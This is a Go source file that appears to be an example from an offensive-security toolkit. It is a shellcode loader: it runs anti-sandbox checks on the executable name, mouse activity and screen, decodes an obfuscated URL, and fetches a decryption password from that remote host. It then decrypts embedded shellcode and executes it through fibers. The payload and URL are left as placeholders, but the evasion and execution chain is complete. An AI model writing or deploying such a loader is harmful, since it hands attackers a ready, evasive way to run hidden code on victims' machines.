package main

import "C"
import (
	"crypto/sha256"
	"encoding/base64"
	"log"

	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
	shellcode "github.com/MrTuxx/OffensiveGolang/pkg/payloads/injections/fibers"
)

func main() {
	evasion.CheckNameEXE("main.exe")
	evasion.CheckMouse(5)
	evasion.CheckScreen()
	enc_string := "<SHELLCODE ENCRYPTED AND BASE64-ENCODED>"

	url := "<URL BRAINFUCK-ENCODED>"
	pattern := "<REGEX BRAINFUCK-ENCODED>"
	password, err := evasion.ExtractMatchedStringFromURL(evasion.DecodeBrainfuck(url, ""), evasion.DecodeBrainfuck(pattern, ""))

	if err != nil {
		log.Fatalf("[!] Error extracting string: %v", err)
	}
	hash := sha256.Sum256([]byte(password))
	key := base64.StdEncoding.EncodeToString(hash[:])
	//println(key)
	shellcode.ShellcodeFibers(enc_string, key)
}
